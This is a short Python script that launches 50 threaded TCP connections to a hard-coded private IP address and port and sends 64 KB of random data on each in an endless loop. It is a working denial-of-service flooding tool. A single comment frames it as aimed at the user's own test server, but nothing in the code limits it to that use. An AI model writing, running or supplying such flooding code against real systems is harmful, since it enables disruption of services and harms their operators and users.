import socket
import threading
import time
import os

TARGET_IP = "192.168.68.6"  # Replace with your test server or local machine
TARGET_PORT = 9000
NUM_CONNECTIONS = 50
PACKET_SIZE = 1024 * 64  # 64 KB
DELAY = 0.01  # Small delay between sends per connection

payload = os.urandom(PACKET_SIZE)

def flood_connection():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TARGET_IP, TARGET_PORT))
        while True:
            s.sendall(payload)
            time.sleep(DELAY)
    except Exception as e:
        print(f"❌ TCP Error: {e}")

print(f"🚀 Launching {NUM_CONNECTIONS} TCP connections to {TARGET_IP}:{TARGET_PORT}")
for _ in range(NUM_CONNECTIONS):
    t = threading.Thread(target=flood_connection, daemon=True)
    t.start()

while True:
    time.sleep(1)  # Keep main thread alive
